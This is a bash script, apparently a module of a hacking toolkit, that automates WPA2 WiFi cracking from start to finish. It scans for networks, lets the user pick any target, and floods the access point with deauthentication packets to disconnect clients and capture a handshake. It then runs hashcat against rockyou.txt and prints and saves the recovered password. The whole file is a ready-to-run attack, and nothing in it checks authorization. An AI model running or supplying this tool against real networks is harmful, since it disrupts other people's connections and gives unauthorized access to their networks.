#!/usr/bin/env bash
# HZ_NAME=Advanced WPA2 Auto Cracker
# HZ_DESC=Interactive WiFi cracking with automatic handshake capture and multi-method password recovery
# HZ_VERSION=3.0.0
# HZ_AUTHOR=HigerZero Community

set -euo pipefail

readonly RED='\033[0;31m'
readonly GREEN='\033[0;32m'
readonly YELLOW='\033[1;33m'
readonly BLUE='\033[0;34m'
readonly CYAN='\033[0;36m'
readonly MAGENTA='\033[0;35m'
readonly WHITE='\033[1;37m'
readonly NC='\033[0m'
readonly BOLD='\033[1m'

readonly PROJECT_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.."; pwd)"
readonly CAPTURE_DIR="${PROJECT_ROOT}/captures"
readonly LOG_DIR="${PROJECT_ROOT}/logs"
readonly REPORT_DIR="${PROJECT_ROOT}/reports"
readonly WORDLIST_DIR="${CAPTURE_DIR}/wordlists"

mkdir -p "$CAPTURE_DIR" "$LOG_DIR" "$REPORT_DIR" "$WORDLIST_DIR"

SELECTED_INTERFACE=""
SELECTED_BSSID=""
SELECTED_SSID=""
SELECTED_CHANNEL=""
MONITOR_INTERFACE=""
HANDSHAKE_FILE=""
HASH_FILE=""
CRACKED_PASSWORD=""

log_info() { echo -e "${GREEN}[INFO]${NC} $*" | tee -a "$LOG_DIR/wpa2_auto_crack.log"; }
log_error() { echo -e "${RED}[ERROR]${NC} $*" >&2 | tee -a "$LOG_DIR/wpa2_auto_crack.log"; }
log_warn() { echo -e "${YELLOW}[WARN]${NC} $*" | tee -a "$LOG_DIR/wpa2_auto_crack.log"; }
log_success() { echo -e "${GREEN}${BOLD}[✓ SUCCESS]${NC} $*" | tee -a "$LOG_DIR/wpa2_auto_crack.log"; }
log_found() { echo -e "${MAGENTA}${BOLD}[!!! FOUND !!!]${NC} $*" | tee -a "$LOG_DIR/wpa2_auto_crack.log"; }

print_header() {
    clear
    echo -e "${CYAN}${BOLD}"
    echo "╔════════════════════════════════════════════════════════════════╗"
    echo "║        Advanced WPA2 Automatic Cracker v3.0.0                 ║"
    echo "║        Interactive WiFi Security Audit Tool                   ║"
    echo "╚════════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

check_dependencies() {
    log_info "Checking required tools..."
    local missing=0
    local required=("airmon-ng" "airodump-ng" "aireplay-ng" "aircrack-ng" "hashcat")
    
    for tool in "${required[@]}"; do
        if ! command -v "$tool" &>/dev/null; then
            log_warn "Missing: $tool"
            ((missing++))
        fi
    done
    
    if [[ $missing -gt 0 ]]; then
        log_error "Missing $missing tools. Install: sudo apt install aircrack-ng hashcat"
        return 1
    fi
    
    log_success "All dependencies found"
    return 0
}

scan_wifi_networks() {
    print_header
    log_info "Scanning WiFi networks... (30 seconds)"
    
    local scan_file="${CAPTURE_DIR}/scan_$(date +%s)"
    
    timeout 30 sudo airodump-ng --output-format csv --write "$scan_file" "$SELECTED_INTERFACE" 2>/dev/null &
    local pid=$!
    
    for i in {1..30}; do
        echo -ne "\r${CYAN}Scanning... [$((i*100/30))%]${NC}"
        sleep 1
    done
    echo ""
    
    wait $pid 2>/dev/null || true
    
    [[ ! -f "${scan_file}-01.csv" ]] && { log_error "Scan failed"; return 1; }
    
    local networks=() bssids=() channels=() powers=()
    
    while IFS=',' read -r bssid freq pwr beacon ivdata lan iprange cipher auth encr essid key; do
        [[ "$bssid" =~ ^\ *$ ]] && continue
        [[ "$bssid" == "BSSID" ]] && continue
        
        bssid=$(echo "$bssid" | xargs)
        essid=$(echo "$essid" | xargs)
        pwr=$(echo "$pwr" | xargs)
        
        [[ -z "$bssid" || "$bssid" == "(not associated)" ]] && continue
        [[ -z "$essid" ]] && essid="(Hidden Network)"
        
        local channel=""
        [[ "$freq" =~ 2.4 ]] && channel=$((($freq - 2407) / 5))
        [[ "$freq" =~ 5. ]] && channel=$((($freq - 5000) / 5))
        
        networks+=("$essid")
        bssids+=("$bssid")
        channels+=("$channel")
        powers+=("$pwr")
    done < <(tail -n +3 "${scan_file}-01.csv" 2>/dev/null)
    
    [[ ${#networks[@]} -eq 0 ]] && { log_error "No networks found"; return 1; }
    
    echo -e "\n${CYAN}${BOLD}Available WiFi Networks:${NC}\n"
    for i in "${!networks[@]}"; do
        printf "%2d) ${BOLD}%-30s${NC} | BSSID: ${YELLOW}%-17s${NC} | CH: ${GREEN}%2s${NC} | PWR: ${MAGENTA}%3s${NC}\n" \
            $((i+1)) "${networks[$i]}" "${bssids[$i]}" "${channels[$i]}" "${powers[$i]}"
    done
    
    echo ""
    read -p "${CYAN}Select network number (1-${#networks[@]}): ${NC}" choice
    choice=$((choice - 1))
    
    [[ $choice -lt 0 || $choice -ge ${#networks[@]} ]] && { log_error "Invalid selection"; return 1; }
    
    SELECTED_SSID="${networks[$choice]}"
    SELECTED_BSSID="${bssids[$choice]}"
    SELECTED_CHANNEL="${channels[$choice]}"
    
    log_success "Selected: $SELECTED_SSID ($SELECTED_BSSID)"
    rm -f "${scan_file}"*
    return 0
}

enable_monitor_mode() {
    log_info "Enabling monitor mode on $SELECTED_INTERFACE..."
    
    if iwconfig "$SELECTED_INTERFACE" 2>/dev/null | grep -q "Mode:Monitor"; then
        log_warn "Already in monitor mode"
        MONITOR_INTERFACE="$SELECTED_INTERFACE"
        return 0
    fi
    
    sudo systemctl stop NetworkManager wpa_supplicant 2>/dev/null || true
    sudo killall -9 wpa_supplicant 2>/dev/null || true
    sleep 1
    
    if sudo airmon-ng start "$SELECTED_INTERFACE" 2>/dev/null | grep -q "monitor"; then
        MONITOR_INTERFACE=$(sudo airmon-ng check 2>/dev/null | grep "monitor" | awk '{print $1}' | head -1)
        [[ -z "$MONITOR_INTERFACE" ]] && MONITOR_INTERFACE="${SELECTED_INTERFACE}mon"
        log_success "Monitor mode enabled: $MONITOR_INTERFACE"
        return 0
    else
        log_error "Failed to enable monitor mode"
        return 1
    fi
}

disable_monitor_mode() {
    [[ -z "$MONITOR_INTERFACE" ]] && return 0
    log_info "Disabling monitor mode..."
    sudo airmon-ng stop "$MONITOR_INTERFACE" 2>/dev/null || true
    sudo systemctl start NetworkManager 2>/dev/null || true
    log_success "Monitor mode disabled"
}

capture_handshake_interactive() {
    print_header
    log_info "Starting handshake capture..."
    log_info "  SSID: $SELECTED_SSID | BSSID: $SELECTED_BSSID | CH: $SELECTED_CHANNEL"
    
    HANDSHAKE_FILE="${CAPTURE_DIR}/handshake_${SELECTED_BSSID//:/_}_$(date +%s)"
    
    echo -e "${YELLOW}Capturing packets (waiting for handshake)...${NC}"
    
    sudo timeout 300 airodump-ng --bssid "$SELECTED_BSSID" --channel "$SELECTED_CHANNEL" --write "$HANDSHAKE_FILE" "$MONITOR_INTERFACE" 2>/dev/null &
    local airodump_pid=$!
    sleep 3
    
    local deauth_count=0 attempt=0 max_attempts=60
    
    while [[ $attempt -lt $max_attempts ]]; do
        sudo aireplay-ng --deauth 5 -a "$SELECTED_BSSID" "$MONITOR_INTERFACE" 2>/dev/null &
        sleep 2
        ((attempt++)) ((deauth_count+=5))
        echo -ne "\r${CYAN}Deauth packets: $deauth_count | Attempt: $attempt/$max_attempts${NC}"
        
        [[ -f "${HANDSHAKE_FILE}.cap" ]] && aircrack-ng "${HANDSHAKE_FILE}.cap" 2>/dev/null | grep -q "WPA.*found" && {
            echo ""
            log_success "Handshake captured!"
            kill $airodump_pid 2>/dev/null || true
            return 0
        }
    done
    
    echo ""
    kill $airodump_pid 2>/dev/null || true
    [[ -f "${HANDSHAKE_FILE}.cap" ]] && { log_success "Capture file created"; return 0; }
    log_error "Handshake capture failed"
    return 1
}

convert_cap_to_hashcat() {
    command -v hcxpcaptool &>/dev/null || return 1
    log_info "Converting handshake to hashcat format..."
    HASH_FILE="${CAPTURE_DIR}/hash_${SELECTED_BSSID//:/_}.hc22000"
    hcxpcaptool -o "$HASH_FILE" "${HANDSHAKE_FILE}.cap" 2>/dev/null && { log_success "Converted to hashcat format"; return 0; }
    return 1
}

crack_with_hashcat_rockyou() {
    [[ ! -f "$HASH_FILE" ]] && { log_error "Hash file not found"; return 1; }
    command -v hashcat &>/dev/null || { log_warn "hashcat not installed"; return 1; }
    
    log_info "Starting hashcat with rockyou.txt..."
    
    local rockyou_path=""
    [[ -f "/usr/share/wordlists/rockyou.txt" ]] && rockyou_path="/usr/share/wordlists/rockyou.txt"
    [[ -f "/usr/share/wordlists/rockyou.txt.gz" ]] && { gunzip -c "/usr/share/wordlists/rockyou.txt.gz" > "${WORDLIST_DIR}/rockyou.txt"; rockyou_path="${WORDLIST_DIR}/rockyou.txt"; }
    
    [[ -z "$rockyou_path" ]] && { log_warn "rockyou.txt not found"; return 1; }
    
    echo -e "\n${YELLOW}${BOLD}Running hashcat (may take a while)...${NC}\n"
    
    if hashcat -m 22000 -a 0 -o "${REPORT_DIR}/cracked_${SELECTED_BSSID//:/_}.txt" --outfile-format=2 "$HASH_FILE" "$rockyou_path" 2>&1; then
        [[ -f "${REPORT_DIR}/cracked_${SELECTED_BSSID//:/_}.txt" ]] && {
            CRACKED_PASSWORD=$(head -1 "${REPORT_DIR}/cracked_${SELECTED_BSSID//:/_}.txt" | cut -d: -f2)
            [[ -n "$CRACKED_PASSWORD" ]] && { log_found "PASSWORD FOUND: $CRACKED_PASSWORD"; show_cracked_result; return 0; }
        }
    fi
    log_warn "Password not found in rockyou.txt"
    return 1
}

generate_common_wordlist() {
    local wordlist="${WORDLIST_DIR}/custom_wifi.txt"
    log_info "Generating common WiFi passwords..."
    cat > "$wordlist" << 'EOF'
password
123456789
12345678
admin
admin123
password123
wifi
router
welcome
abc123
qwerty
monkey
letmein
1q2w3e4r
pass123
password1
network
secure
default
guest
test
temporary
mypass
pass
pass1234
router123
wifi123
secure123
111111
000000
123123
changeme
settings
EOF
    log_success "Wordlist created: $(wc -l < "$wordlist") passwords"
}

show_cracked_result() {
    clear
    echo -e "${MAGENTA}${BOLD}"
    echo "╔════════════════════════════════════════════════════════════════╗"
    echo "║                    🎉 PASSWORD CRACKED! 🎉                    ║"
    echo "╚════════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
    
    echo -e "${GREEN}${BOLD}Network Information:${NC}"
    echo -e "  SSID: ${CYAN}$SELECTED_SSID${NC}"
    echo -e "  BSSID: ${CYAN}$SELECTED_BSSID${NC}"
    echo -e "  Channel: ${CYAN}$SELECTED_CHANNEL${NC}"
    echo ""
    
    echo -e "${YELLOW}${BOLD}CRACKED PASSWORD:${NC}"
    echo -e "${GREEN}${BOLD}  >>> $CRACKED_PASSWORD <<<${NC}"
    echo ""
    
    {
        echo "==================================="
        echo "WiFi Password Cracking Report"
        echo "==================================="
        echo "Date: $(date)"
        echo ""
        echo "Network: $SELECTED_SSID"
        echo "BSSID: $SELECTED_BSSID"
        echo "Channel: $SELECTED_CHANNEL"
        echo ""
        echo "CRACKED PASSWORD: $CRACKED_PASSWORD"
        echo ""
        echo "Files:"
        echo "  Handshake: ${HANDSHAKE_FILE}.cap"
        echo "  Hash: $HASH_FILE"
    } | tee "${REPORT_DIR}/cracked_${SELECTED_BSSID//:/_}_report.txt"
    
    log_success "Report saved: ${REPORT_DIR}/cracked_${SELECTED_BSSID//:/_}_report.txt"
}

module_main() {
    print_header
    
    check_dependencies || return 1
    
    local interfaces=$(iwconfig 2>/dev/null | grep -oE "^[^ ]+" | sort -u || echo "")
    [[ -z "$interfaces" ]] && { log_error "No wireless interfaces found"; return 1; }
    
    echo -e "${CYAN}${BOLD}Available Interfaces:${NC}\n"
    local count=1 iface_array=()
    while read -r iface; do
        iface_array+=("$iface")
        echo "  $count) $iface"
        ((count++))
    done <<< "$interfaces"
    
    if [[ ${#iface_array[@]} -eq 1 ]]; then
        SELECTED_INTERFACE="${iface_array[0]}"
    else
        read -p "${CYAN}Select interface number: ${NC}" choice
        choice=$((choice - 1))
        SELECTED_INTERFACE="${iface_array[$choice]}"
    fi
    
    log_success "Using interface: $SELECTED_INTERFACE"
    enable_monitor_mode || { log_error "Monitor mode failed"; return 1; }
    scan_wifi_networks || { disable_monitor_mode; return 1; }
    capture_handshake_interactive || { log_error "Handshake capture failed"; disable_monitor_mode; return 1; }
    
    print_header
    log_info "Starting password cracking..."
    convert_cap_to_hashcat && crack_with_hashcat_rockyou && { disable_monitor_mode; return 0; }
    generate_common_wordlist
    log_warn "Password not found in rockyou.txt"
    log_info "Hash file: $HASH_FILE"
    log_info "Handshake file: ${HANDSHAKE_FILE}.cap"
    disable_monitor_mode
    return 1
}

cleanup() { disable_monitor_mode || true; }
trap cleanup EXIT INT TERM

[[ "${BASH_SOURCE[0]}" == "${0}" ]] && module_main "$@"